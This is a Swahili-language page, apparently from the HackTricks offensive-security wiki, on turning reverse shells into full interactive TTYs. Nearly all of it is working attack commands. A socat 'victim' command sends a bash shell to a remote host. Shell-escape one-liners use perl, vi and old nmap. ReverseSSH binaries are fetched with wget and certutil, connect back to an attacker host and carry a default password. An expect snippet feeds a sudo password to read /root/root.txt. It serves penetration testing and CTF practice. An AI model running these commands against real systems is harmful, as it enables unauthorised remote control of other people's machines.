# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` huorodhesha majina ya njia za login-shell halali na hutumiwa na baadhi ya programu; si sharti la jumla la kutenga PTY.<sup>[[3]](#references)[[4]](#references)</sup> Ikiwa programu kama `pkexec` inakataa `SHELL` kwa ujumbe `The value for the SHELL variable was not found in the /etc/shells file`, hakikisha njia kamili ya shell (kwa mfano, `/bin/bash`) ipo kwenye `/etc/shells`.<sup>[[10]](#references)</sup> Mfuatano wa kurejesha `CTRL+Z`/`fg` ulio hapa chini hutumia Bash job control; ikiwa shell ya sasa si Bash, anzisha Bash kabla ya kutumia mfuatano huo.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` ya Python huanzisha programu iliyounganishwa na stream za kawaida za input, output, na error za process ya sasa, hivyo kuipa Bash pseudo-terminal katika session hii.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Unaweza kupata **idadi** ya **rows** na **columns** kwa kuendesha **`stty -a`**; `-a` huchapisha mipangilio yote ya sasa ya terminal. Matokeo ya command hii hutegemea terminal, kwa hivyo tumia thamani zilizoripotiwa na session ya sasa.<sup>[[11]](#references)</sup>

#### script

Utility ya `script` hurekodi session ya terminal; hapa `/dev/null` hutupa typescript, `-q` huzuia ujumbe wa kuanza na kukamilika, na `-c` huendesha Bash badala ya shell ya default.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Baada ya kutumia mojawapo ya mbinu za PTY-spawn, simamisha kipindi cha Netcat na ukirejeshe kwa kutumia local raw mode, kisha weka mazingira na vipimo vya terminal ya remote:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Msikilizaji hutumia terminal ya sasa katika raw mode huku local echo ikiwa imezimwa na hukubali miunganisho ya TCP kwenye port 4444. Command ya victim hutenga pty, huunganisha stderr, huunda session, hupeleka SIGINT, na hutumia mipangilio sane ya terminal; ongeza `ctty` ikiwa child inahitaji controlling terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Unda shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (matoleo ya zamani yenye `--interactive`): `!sh`

Nmap escape hii inategemea version: Nmap iliondoa mode yake ya `--interactive` katika releases za baadaye, kwa hivyo `!sh` inatumika tu kwenye matoleo ya zamani.<sup>[[13]](#references)</sup>

## ReverseSSH

Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka ssh server iliyounganishwa statically [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye target.<sup>[[1]](#references)</sup>

Hapa chini kuna mfano wa `x86` ukitumia binary iliyobanwa kwa UPX na kuchapishwa na mradi. Kwa architectures nyingine au release artifacts, tumia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) kama mwongozo wa navigation.<sup>[[1]](#references)</sup>

1. Andaa local host ili ipokee incoming SSH connection. Katika listener mode, `-l` huwezesha listener na `-p 4444` huchagua port ambayo itakubali connection kutoka kwa target.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. Hamisha artifact ile ile ya `upx_reverse-sshx86` hadi `/dev/shm/reverse-ssh` na uifanye iwe executable. `-p 4444` ya target huchagua listener port iliyo hapo juu, na `kali@10.0.0.2` hutoa account na host zinazotumiwa kuanzisha muunganisho wa kurudi.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. PowerShell yenye mwingiliano kamili inahitaji Windows 10 build 17763; tazama [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Mfano wa Windows unatumia `certutil` pamoja na `-f -urlcache`; Microsoft inaeleza `-f` kama kulazimisha URL fetch na inabainisha kuwa parameters zinazopatikana hutofautiana kulingana na version, kwa hivyo angalia `certutil -?` ikiwa muundo huu haupatikani.<sup>[[12]](#references)</sup>

- Baada ya reverse connection kufanikiwa, reverse-mode listener ya ReverseSSH hufunga port `8888` kwa default (au thamani iliyotolewa kwa `-b`), na connections zinazoingia zinakubali username yoyote pamoja na password ya default `letmeinbrudipls`. Remote shell huendeshwa kwa privileges za account iliyoanzisha `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) huboresha kiotomatiki reverse shells za Unix-like kuwa PTY, hubadilisha ukubwa wa Unix-like terminals, na kurekodi mwingiliano wa shell; kwa Windows shells hutoa readline lakini si kubadilisha ukubwa wa terminal kwa wakati halisi.<sup>[[2]](#references)</sup>

Endesha `penelope` ili kusikiliza kwenye `0.0.0.0:4444` kwa chaguo-msingi; Unix-like shells zinazoingia zinaweza kuboreshwa na kurekodiwa kiotomatiki.<sup>[[2]](#references)</sup>

## Hakuna TTY

Ikiwa kwa sababu fulani huwezi kupata TTY kamili, **bado unaweza kuingiliana na programu** zinazotarajia ingizo la mtumiaji. Katika mfano ufuatao, Expect huanzisha `sudo`, husubiri ombi lake la nenosiri, hutuma nenosiri, na kurudisha udhibiti kwa `interact`; `sudo -S` husoma nenosiri lake kutoka kwenye ingizo la kawaida. Itumie tu katika lab iliyoidhinishwa na epuka kuweka credentials halisi kwenye historia ya shell au faili za source.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Seva ya ssh iliyounganishwa tuli yenye utendaji wa reverse shell kwa CTF na kadhalika](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Kishikilia shell kinachoweka kiotomatiki baadhi ya mambo ili kurahisisha matumizi](https://github.com/brightio/penelope)
- [3] [shells(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Nyaraka za Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Mwongozo wa Marejeleo wa Bash — Udhibiti wa Kazi](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap — Rekodi ya Mabadiliko](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
